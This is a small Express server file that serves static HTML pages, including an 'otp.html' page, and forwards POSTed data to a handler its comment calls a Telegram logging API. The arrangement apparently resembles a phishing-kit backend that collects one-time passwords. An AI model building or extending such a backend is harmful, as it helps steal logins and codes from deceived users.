const express = require('express');
const path = require('path');

const app = express();
app.set('trust proxy', 1); // Coolify / reverse proxy setter x-forwarded-for
const port = Number(process.env.PORT) || 3000;
const logDataHandler = require('./api/log_data');

// Middleware to parse JSON data
app.use(express.json());

// Telegram / logging API (brukes av alle HTML-sider som kaller fetch('/api/log_data'))
app.post('/api/log_data', logDataHandler);

// Serve static files from the project root (where the HTML files live)
app.use(express.static(__dirname));

app.listen(port, () => {
    console.log(`Server listening at http://localhost:${port}`);
    console.log(`Serving static files from the project root.`);
    console.log(`To test, open your browser to (e.g.):`);
    console.log(`  http://localhost:${port}/`);
    console.log(`  http://localhost:${port}/otp.html`);
});
